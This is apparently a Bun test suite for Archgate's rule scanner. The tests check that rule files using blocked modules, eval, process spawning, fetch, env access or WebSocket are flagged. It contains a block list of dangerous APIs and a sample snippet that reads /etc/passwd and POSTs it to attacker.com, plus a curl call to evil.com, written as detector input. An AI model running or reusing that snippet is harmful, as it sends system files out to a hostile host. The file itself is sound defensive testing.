// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Archgate
import { describe, expect, test } from "bun:test";

import {
  scanImportedRuleSource,
  scanRuleSource,
} from "../../src/engine/rule-scanner";

describe("scanRuleSource", () => {
  describe("banned imports", () => {
    const bannedModules = [
      "node:fs",
      "fs",
      "node:child_process",
      "child_process",
      "node:net",
      "node:dgram",
      "node:http",
      "node:https",
      "node:http2",
      "node:worker_threads",
      "node:cluster",
      "node:vm",
      "node:fs/promises",
      "bun",
    ];

    for (const mod of bannedModules) {
      test(`blocks ${mod} import`, () => {
        const violations = scanRuleSource(`import x from "${mod}";`);
        expect(violations).toHaveLength(1);
        expect(violations[0].message).toContain(`"${mod}"`);
        expect(violations[0].message).toContain("blocked");
      });
    }

    const safeModules = ["node:path", "node:url", "node:util", "node:crypto"];

    for (const mod of safeModules) {
      test(`allows ${mod} import`, () => {
        const violations = scanRuleSource(`import x from "${mod}";`);
        expect(violations).toHaveLength(0);
      });
    }
  });

  describe("dangerous Bun APIs", () => {
    test("blocks Bun.spawn", () => {
      const violations = scanRuleSource(`Bun.spawn(["ls"]);`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Bun.spawn()");
    });

    test("blocks Bun.spawnSync", () => {
      const violations = scanRuleSource(`Bun.spawnSync(["ls"]);`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Bun.spawnSync()");
    });

    test("blocks Bun.write", () => {
      const violations = scanRuleSource(`Bun.write("output.txt", "data");`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Bun.write()");
    });

    test("blocks Bun.$", () => {
      const violations = scanRuleSource(`Bun.$;`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Bun.$()");
    });

    test("blocks Bun.file", () => {
      const violations = scanRuleSource(`Bun.file("/etc/passwd");`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Bun.file()");
    });
  });

  describe("computed property access", () => {
    test("blocks Bun[variable]", () => {
      const violations = scanRuleSource(
        `const method = "spawn"; Bun[method]();`
      );
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain(
        "Computed property access on Bun"
      );
    });

    test("blocks globalThis[variable]", () => {
      const violations = scanRuleSource(
        `const key = "fetch"; globalThis[key]();`
      );
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain(
        "Computed property access on globalThis"
      );
    });
  });

  describe("eval and Function constructor", () => {
    test("blocks eval()", () => {
      const violations = scanRuleSource(`eval("console.log(1)");`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("eval()");
    });

    test("blocks new Function()", () => {
      const violations = scanRuleSource(`new Function("return 1")();`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("new Function()");
    });

    test("blocks Function() without new", () => {
      const violations = scanRuleSource(`Function("return 1")();`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Function() constructor");
    });
  });

  describe("fetch", () => {
    test("blocks fetch()", () => {
      const violations = scanRuleSource(`fetch("https://example.com");`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("fetch()");
    });
  });

  describe("dynamic imports", () => {
    test("blocks import(variable)", () => {
      const violations = scanRuleSource(`const mod = "node:fs"; import(mod);`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Dynamic import()");
    });

    test("allows import with literal string", () => {
      const violations = scanRuleSource(`import("node:path");`);
      // Static import expression with literal — allowed by dynamic import check.
      // But node:path is safe so no import declaration violation either.
      const dynamicViolations = violations.filter((v) =>
        v.message.includes("Dynamic import()")
      );
      expect(dynamicViolations).toHaveLength(0);
    });
  });

  describe("global mutation", () => {
    test("blocks globalThis assignment", () => {
      const violations = scanRuleSource(`globalThis.myGlobal = "value";`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Mutating globalThis");
    });

    test("blocks process.env assignment", () => {
      const violations = scanRuleSource(`process.env = {};`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Mutating process.env");
    });
  });

  describe("TypeScript support", () => {
    test("handles TypeScript syntax (interfaces, type annotations)", () => {
      const source = `
				interface Config { name: string; }
				const config: Config = { name: "test" };
				export default { rules: {} };
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });

    test("handles satisfies keyword", () => {
      const source = `
				type RuleSet = { rules: Record<string, unknown> };
				export default { rules: {} } satisfies RuleSet;
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });
  });

  describe("clean rule files", () => {
    test("passes a well-behaved rule using only RuleContext", () => {
      const source = `
				export default {
					rules: {
						"my-rule": {
							description: "Check something",
							async check(ctx) {
								const files = await ctx.glob("src/**/*.ts");
								for (const file of files) {
									const content = await ctx.readFile(file);
									if (content.includes("TODO")) {
										ctx.report.warning({ message: "Found TODO", file });
									}
								}
							},
						},
					},
				};
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });

    test("passes rule with safe imports (node:path, node:url)", () => {
      const source = `
				import { join } from "node:path";
				import { URL } from "node:url";

				export default {
					rules: {
						"path-rule": {
							description: "Uses safe modules",
							async check(ctx) {
								const p = join("src", "index.ts");
								const url = new URL("https://example.com");
							},
						},
					},
				};
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });
  });

  describe("multiple violations", () => {
    test("reports all violations in a single file", () => {
      const source = `
				import { readFileSync } from "node:fs";
				import { execSync } from "node:child_process";

				const secret = readFileSync("/etc/passwd", "utf8");
				fetch("https://attacker.com", { method: "POST", body: secret });
				Bun.spawn(["curl", "https://evil.com"]);
			`;
      const violations = scanRuleSource(source);
      expect(violations.length).toBeGreaterThanOrEqual(4);
    });
  });

  describe("violation location", () => {
    test("reports line and column for simple case", () => {
      const source = `const x = 1;\neval("code");`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(1);
      expect(violations[0].line).toBe(2);
      expect(violations[0].column).toBe(0);
      expect(violations[0].endLine).toBe(2);
      // endColumn covers the search text "eval(" = 5 chars
      expect(violations[0].endColumn).toBe(5);
    });
  });

  // Position remapping tests are in rule-scanner-positions.test.ts
});

describe("scanImportedRuleSource", () => {
  describe("imported-only: Bun.env access", () => {
    test("blocks Bun.env.FOO read", () => {
      const source = `const token = Bun.env.FOO;`;
      const violations = scanImportedRuleSource(source);
      const envViolations = violations.filter((v) =>
        v.message.includes("Bun.env")
      );
      expect(envViolations).toHaveLength(1);
      expect(envViolations[0].message).toContain(
        "Bun.env access is blocked in imported rule files"
      );
    });

    test("blocks bare Bun.env access", () => {
      const source = `const env = Bun.env;`;
      const violations = scanImportedRuleSource(source);
      const envViolations = violations.filter((v) =>
        v.message.includes("Bun.env")
      );
      expect(envViolations).toHaveLength(1);
    });
  });

  describe("imported-only: process.env access", () => {
    test("blocks process.env read", () => {
      const source = `const val = process.env.SECRET;`;
      const violations = scanImportedRuleSource(source);
      const envViolations = violations.filter((v) =>
        v.message.includes("process.env")
      );
      expect(envViolations).toHaveLength(1);
      expect(envViolations[0].message).toContain(
        "process.env access is blocked in imported rule files"
      );
    });
  });

  describe("imported-only: require() call", () => {
    test("blocks require() call", () => {
      const source = `const mod = require("some-module");`;
      const violations = scanImportedRuleSource(source);
      const requireViolations = violations.filter((v) =>
        v.message.includes("require()")
      );
      expect(requireViolations).toHaveLength(1);
      expect(requireViolations[0].message).toContain(
        "require() is blocked in imported rule files"
      );
    });
  });

  describe("imported-only: WebSocket usage", () => {
    test("blocks new WebSocket()", () => {
      const source = `const ws = new WebSocket("ws://localhost");`;
      const violations = scanImportedRuleSource(source);
      const wsViolations = violations.filter((v) =>
        v.message.includes("WebSocket")
      );
      expect(wsViolations).toHaveLength(1);
      expect(wsViolations[0].message).toContain(
        "new WebSocket() is blocked in imported rule files"
      );
    });

    test("blocks WebSocket() without new", () => {
      const source = `const ws = WebSocket("ws://localhost");`;
      const violations = scanImportedRuleSource(source);
      const wsViolations = violations.filter((v) =>
        v.message.includes("WebSocket")
      );
      expect(wsViolations).toHaveLength(1);
      expect(wsViolations[0].message).toContain(
        "WebSocket() is blocked in imported rule files"
      );
    });
  });

  describe("multiple imported-only violations", () => {
    test("reports all imported-only violations together", () => {
      const source = `
const token = Bun.env.TOKEN;
const secret = process.env.SECRET;
const mod = require("dangerous");
const ws = new WebSocket("ws://localhost");
`;
      const violations = scanImportedRuleSource(source);
      const importedMessages = violations.map((v) => v.message);

      expect(importedMessages.some((m) => m.includes("Bun.env"))).toBe(true);
      expect(importedMessages.some((m) => m.includes("process.env"))).toBe(
        true
      );
      expect(importedMessages.some((m) => m.includes("require()"))).toBe(true);
      expect(importedMessages.some((m) => m.includes("new WebSocket()"))).toBe(
        true
      );
    });
  });

  describe("standard violations are included", () => {
    test("includes standard scanRuleSource violations alongside imported-only ones", () => {
      const source = `
import { readFileSync } from "node:fs";
const token = Bun.env.TOKEN;
eval("code");
`;
      const violations = scanImportedRuleSource(source);
      const messages = violations.map((v) => v.message);

      // Standard violations (from scanRuleSource)
      expect(messages.some((m) => m.includes('"node:fs"'))).toBe(true);
      expect(messages.some((m) => m.includes("eval()"))).toBe(true);
      // Imported-only violation
      expect(messages.some((m) => m.includes("Bun.env"))).toBe(true);
    });
  });

  describe("clean imported rule", () => {
    test("passes when using only safe patterns", () => {
      const source = `
import { join } from "node:path";
import { URL } from "node:url";

export default {
  rules: {
    "safe-rule": {
      description: "A clean imported rule",
      async check(ctx) {
        const files = await ctx.glob("src/**/*.ts");
        for (const file of files) {
          const content = await ctx.readFile(file);
          if (content.includes("TODO")) {
            ctx.report.warning({ message: "Found TODO", file });
          }
        }
      },
    },
  },
};
`;
      const violations = scanImportedRuleSource(source);
      expect(violations).toHaveLength(0);
    });
  });

  describe("safe module imports remain allowed", () => {
    const safeModules = ["node:path", "node:url", "node:util", "node:crypto"];

    for (const mod of safeModules) {
      test(`allows ${mod} import in imported rules`, () => {
        const violations = scanImportedRuleSource(`import x from "${mod}";`);
        expect(violations).toHaveLength(0);
      });
    }
  });

  describe("violation location for imported checks", () => {
    test("reports correct line and column for Bun.env", () => {
      const source = `const x = 1;\nconst t = Bun.env.TOKEN;`;
      const violations = scanImportedRuleSource(source);
      const envViolation = violations.find((v) =>
        v.message.includes("Bun.env")
      );
      expect(envViolation).toBeDefined();
      expect(envViolation!.line).toBe(2);
      expect(envViolation!.column).toBe(10);
      // "Bun.env" is 7 chars, so endColumn = 10 + 7 = 17
      expect(envViolation!.endColumn).toBe(17);
    });

    test("reports correct line and column for require()", () => {
      const source = `const a = 1;\nconst b = 2;\nconst m = require("foo");`;
      const violations = scanImportedRuleSource(source);
      const reqViolation = violations.find((v) =>
        v.message.includes("require()")
      );
      expect(reqViolation).toBeDefined();
      expect(reqViolation!.line).toBe(3);
      expect(reqViolation!.column).toBe(10);
      // "require(" is 8 chars, so endColumn = 10 + 8 = 18
      expect(reqViolation!.endColumn).toBe(18);
    });

    test("reports correct line for new WebSocket()", () => {
      const source = `const x = 1;\nconst ws = new WebSocket("ws://localhost");`;
      const violations = scanImportedRuleSource(source);
      const wsViolation = violations.find((v) =>
        v.message.includes("WebSocket")
      );
      expect(wsViolation).toBeDefined();
      expect(wsViolation!.line).toBe(2);
    });
  });
});
